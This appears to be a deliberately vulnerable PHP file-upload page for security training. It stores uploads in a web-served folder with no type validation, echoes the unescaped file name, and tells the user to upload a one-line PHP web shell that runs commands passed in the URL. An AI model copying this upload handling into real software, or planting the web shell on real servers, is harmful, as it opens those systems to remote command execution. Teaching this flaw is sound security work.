<?php

require_once 'config.php'; // Include database connection
$uploadDir = "uploads/";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $fileName = basename($_FILES["file"]["name"]);
    $uploadFile = $uploadDir . $fileName;

    // No file type validation (OWASP A8)
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $uploadFile)) {
        echo "<p style='color:green;'>File uploaded: <a href='$uploadFile'>$fileName</a></p>";
    } else {
        echo "<p style='color:red;'>File upload failed.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Upload</title>
</head>
<body>
    <h2>Upload a File</h2>
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>

    <h3>Try Uploading a Malicious File:</h3>
    <p>Upload <code>shell.php</code> with content: <br>
    <code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
</body>
</html>
